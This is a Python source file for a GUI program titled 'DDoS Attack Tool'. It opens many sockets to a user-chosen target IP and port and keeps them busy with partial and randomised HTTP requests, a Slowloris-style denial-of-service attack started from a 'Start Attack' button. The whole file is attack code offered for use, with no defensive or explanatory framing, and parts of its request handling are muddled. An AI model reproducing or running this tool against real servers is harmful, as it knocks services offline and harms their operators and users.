import requests
import random
import socket
import time
import logging
import sys
import tkinter as tk
from tkinter import messagebox

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))

    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))

    return s

def send_request(s, method="GET", url="/", headers=None, data=None):
    # Generate random headers for each request if not provided
    if not headers:
        headers = random.choice(regular_headers)
    s.send("{}\r\n".format(headers).encode('UTF-8'))

    # Add random data to the request body
    if data:
        s.send(data.encode('UTF-8'))

    # Send the request
    request = "{} {} HTTP/1.1\r\n".format(method, url)
    s.send(request.encode('UTF-8'))

def main(ip, port, socket_count, timer):
    socket_list = []

    for _ in range(socket_count):
        try:
            s = init_socket(ip, port)
        except socket.error:
            break
        socket_list.append(s)

    while True:
        for s in socket_list:
            try:
                time.sleep(random.randint(1, 10))

                http_methods = ["GET", "POST", "PUT", "DELETE"]
                method = random.choice(http_methods)

                urls = ["/", "/page1", "/page2", "/api/data"]
                url = random.choice(urls)

                data = None
                if method in ["POST", "PUT"]:
                    data = generate_random_data()

                headers = generate_custom_headers()

                send_request(s, method, url, headers, data)

                response = s.recv(1024)
                logging.info("Response status code: {}".format(response.decode('UTF-8')))
            except socket.error:
                socket_list.remove(s)
                logging.error("Socket error occurred.")

        for _ in range(socket_count - len(socket_list)):
            try:
                s = init_socket(ip, port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break

        time.sleep(timer)

        for s in socket_list:
            try:
                s.recv(1024)
            except socket.error:
                socket_list.remove(s)
                logging.error("Socket error occurred.")

        if len(socket_list) == 0:
            break

        time.sleep(random.randint(1, 10))

def generate_random_data():
    data_size = random.randint(1, 1024)
    return 'x' * data_size

def generate_custom_headers():
    custom_headers = [
        "X-Request-ID: {}".format(random.randint(1, 1000)),
        "Content-Type: application/json"
    ]
    return random.choice(custom_headers)

def start_attack():
    ip = entry_ip.get()
    port = entry_port.get()
    socket_count = int(entry_socket_count.get())
    timer = int(entry_timer.get())

    try:
        main(ip, port, socket_count, timer)
    except Exception as e:
        messagebox.showerror("Error", str(e))

# Create the GUI window
window = tk.Tk()
window.title("DDoS Attack Tool")

# Create and position the labels
label_ip = tk.Label(window, text="Target IP:")
label_ip.grid(row=0, column=0, padx=5, pady=5)

label_port = tk.Label(window, text="Target Port:")
label_port.grid(row=1, column=0, padx=5, pady=5)

label_socket_count = tk.Label(window, text="Socket Count:")
label_socket_count.grid(row=2, column=0, padx=5, pady=5)

label_timer = tk.Label(window, text="Timer (seconds):")
label_timer.grid(row=3, column=0, padx=5, pady=5)

# Create and position the entry fields
entry_ip = tk.Entry(window)
entry_ip.grid(row=0, column=1, padx=5, pady=5)

entry_port = tk.Entry(window)
entry_port.grid(row=1, column=1, padx=5, pady=5)

entry_socket_count = tk.Entry(window)
entry_socket_count.grid(row=2, column=1, padx=5, pady=5)

entry_timer = tk.Entry(window)
entry_timer.grid(row=3, column=1, padx=5, pady=5)

# Create and position the start button
start_button = tk.Button(window, text="Start Attack", command=start_attack)
start_button.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

# Start the GUI event loop
window.mainloop()
